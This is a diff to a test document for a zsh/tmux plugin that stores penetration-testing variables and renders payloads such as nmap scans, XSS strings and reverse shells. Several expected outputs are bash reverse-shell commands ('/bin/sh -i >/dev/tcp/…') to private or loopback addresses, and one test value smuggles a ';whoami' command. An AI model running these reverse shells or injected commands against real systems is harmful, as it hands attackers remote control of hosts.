@@ -53,6 +53,29 @@ ok
 ok
 ```
 
+## Lowercase Payload Render Test
+
+This verifies that normal payload rendering replaces lowercase `$name`
+placeholders from tmux while leaving uppercase shell variables unchanged.
+
+```zsh
+tmux kill-session -t codex-ii-lower-payload 2>/dev/null || true
+tmux new-session -d -s codex-ii-lower-payload -x 120 -y 30 zsh
+tmux send-keys -t codex-ii-lower-payload "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
+tmux send-keys -t codex-ii-lower-payload "source ./ii.plugin.zsh" Enter
+tmux send-keys -t codex-ii-lower-payload "ii s rhost 10.10.10.20" Enter
+tmux send-keys -t codex-ii-lower-payload "ii_payload_render payloads/script/tool/nmap/nmap" Enter
+sleep 2
+tmux capture-pane -t codex-ii-lower-payload -p -S -80
+tmux kill-session -t codex-ii-lower-payload
+```
+
+Expected sign:
+
+```text
+sudo nmap -p- -Pn -T4 10.10.10.20
+```
+
 Expected script copy sign:
 
 ```text
@@ -75,10 +98,9 @@ tmux send-keys -t codex-jj-test "ii s DOMAIN example.test" Enter
 tmux send-keys -t codex-jj-test "ii ls" Enter
 tmux send-keys -t codex-jj-test "ii ls host" Enter
 tmux send-keys -t codex-jj-test "ii l" Enter
-tmux send-keys -t codex-jj-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
+tmux send-keys -t codex-jj-test "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
 sleep 2
 tmux capture-pane -t codex-jj-test -p -S -200
-tmux show-buffer
 tmux kill-session -t codex-jj-test
 ```
 
@@ -88,17 +110,17 @@ Expected payload:
 /bin/sh -i >/dev/tcp/127.0.0.1/4444 2>&1 0>&1
 ```
 
-Expected used variables:
+Expected render report:
 
 ```text
-lhost used: 127.0.0.1
-lport used: 4444
+lhost used from shell: 127.0.0.1
+lport used from shell: 4444
 ```
 
 ## Cross Pane tmux Test
 
-This verifies that `ii p` reads tmux session values directly, without requiring
-`ii l` in the rendering pane.
+This verifies that `ii p` falls back to tmux session values when the rendering
+pane has not run `ii l`.
 
 ```zsh
 tmux kill-session -t codex-jj-crosspane 2>/dev/null || true
@@ -122,14 +144,14 @@ Expected signs:
 ```text
 pane2-shell-before:
 /bin/sh -i >/dev/tcp/10.10.10.10/9001 2>&1 0>&1
-lhost used: 10.10.10.10
-lport used: 9001
+lhost used from ii: 10.10.10.10
+lport used from ii: 9001
 ```
 
-## Payload Missing Variable Fallback Test
+## Payload Missing Variable Preservation Test
 
-This verifies that missing payload variables render as lowercase shell fallback
-references instead of blocking copy.
+This verifies that missing payload variables keep their original token and are
+reported as unresolved instead of blocking render/output.
 
 ```zsh
 tmux kill-session -t codex-ii-payload-fallback 2>/dev/null || true
@@ -138,19 +160,18 @@ tmux send-keys -t codex-ii-payload-fallback "cd /mnt/d/4_L-Repo/0_Developing/dev
 tmux send-keys -t codex-ii-payload-fallback "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-payload-fallback "printf 'y\n' | ii unset -a" Enter
 tmux send-keys -t codex-ii-payload-fallback "ii s LHOST 127.0.0.1" Enter
-tmux send-keys -t codex-ii-payload-fallback "FZF_DEFAULT_OPTS='--filter=sh-tcp' II_CLIP_CMD='tmux load-buffer -' ii p linux" Enter
+tmux send-keys -t codex-ii-payload-fallback "FZF_DEFAULT_OPTS='--filter=sh-tcp' ii p linux" Enter
 sleep 2
 tmux capture-pane -t codex-ii-payload-fallback -p -S -140
-tmux show-buffer
 tmux kill-session -t codex-ii-payload-fallback
 ```
 
 Expected signs:
 
 ```text
-/bin/sh -i >/dev/tcp/127.0.0.1/$lport 2>&1 0>&1
-lhost used: 127.0.0.1
-lport used: $lport
+/bin/sh -i >/dev/tcp/127.0.0.1/${II_LPORT} 2>&1 0>&1
+lhost used from shell: 127.0.0.1
+lport unresolved: kept as ${II_LPORT}
 ```
 
 ## Special Character Copy Test
@@ -164,7 +185,7 @@ tmux new-session -d -s codex-jj-special -x 120 -y 40 zsh
 tmux send-keys -t codex-jj-special "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" Enter
 tmux send-keys -t codex-jj-special "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-jj-special "ii s DOMAIN \"a b/c;whoami & test\"" Enter
-tmux send-keys -t codex-jj-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
+tmux send-keys -t codex-jj-special "FZF_DEFAULT_OPTS='--filter=basic-alert' II_PAYLOAD_KEY=y II_CLIP_CMD='tmux load-buffer -' ii p xss" Enter
 sleep 2
 tmux capture-pane -t codex-jj-special -p -S -120
 tmux show-buffer
@@ -492,7 +513,7 @@ tmux send-keys -t codex-ii-i "cd /mnt/d/4_L-Repo/0_Developing/dev-tui-jj-kali" E
 tmux send-keys -t codex-ii-i "source ./ii.plugin.zsh" Enter
 tmux send-keys -t codex-ii-i "ii s LHOST 172.16.1.10" Enter
 tmux send-keys -t codex-ii-i "unset LHOST lhost ii_lhost" Enter
-tmux send-keys -t codex-ii-i "FZF_DEFAULT_OPTS='--filter=lhost' II_INTERACTIVE_KEY=ctrl-y II_CLIP_CMD='tmux load-buffer -' ii i" Enter
+tmux send-keys -t codex-ii-i "FZF_DEFAULT_OPTS='--filter=lhost' II_INTERACTIVE_KEY=y II_CLIP_CMD='tmux load-buffer -' ii i" Enter
 tmux send-keys -t codex-ii-i "echo loaded:\$LHOST/\$lhost" Enter
 sleep 2
 tmux capture-pane -t codex-ii-i -p -S -100
@@ -503,8 +524,7 @@ tmux kill-session -t codex-ii-i
 Expected signs:
 
 ```text
-copied 1 variable value(s)
-172.16.1.10
+copied lhost
 loaded:/
 ```
 
